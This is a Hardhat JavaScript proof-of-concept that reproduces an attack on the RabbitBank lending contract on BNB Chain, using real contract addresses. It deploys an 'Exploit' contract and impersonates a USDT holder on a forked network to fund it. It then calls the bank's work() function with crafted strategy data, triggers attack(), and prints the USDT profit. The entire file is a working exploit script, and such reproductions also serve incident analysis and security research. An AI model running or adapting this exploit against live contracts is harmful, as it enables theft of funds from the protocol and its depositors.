const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");
const hre = require("hardhat");

const UsdtAddress = "0x55d398326f99059fF775485246999027B3197955";
const UsdtHolder = '0xEFDca55e4bCE6c1d535cb2D0687B5567eEF2AE83';
const RabbitBankAddress = '0xc18907269640D11E2A91D7204f33C5115Ce3419e';
const Strategy = "0x5085c49828B0B8e69bAe99d96a8e0FCf0A033369"

async function main() {
  let Exploit = await hre.ethers.getContractFactory("Exploit");
  const exp = await Exploit.deploy();
  await exp.deployed();
  console.log("Exploit contract deployed to:", exp.address);

  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [UsdtHolder],
  });
  const signer = await hre.ethers.getSigner(UsdtHolder)
  const USDT = await hre.ethers.getContractAt("IERC20", UsdtAddress, signer);

  let amount = ethers.utils.parseEther('500.0');
  await USDT.transfer(exp.address, amount);
  console.log('Assuming that the hacker has 500U.');

  await exp.init();

  let pair = await exp.pair();
  const bank = await hre.ethers.getContractAt("IBank", RabbitBankAddress, signer);

  let data = hre.ethers.utils.defaultAbiCoder.encode(
    ['address', 'uint', 'uint', 'address', 'uint'],
    [Strategy, 0x40, 0x40, pair, 2]
  );
  let borrowAmount = await USDT.balanceOf(RabbitBankAddress);
  await bank.work(0, 15, borrowAmount, data);

  let before = await USDT.balanceOf(exp.address);
  await exp.attack();
  let after = await USDT.balanceOf(exp.address);
  console.log("Profit: %d $USDT", parseInt(ethers.utils.formatEther(after.sub(before))));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
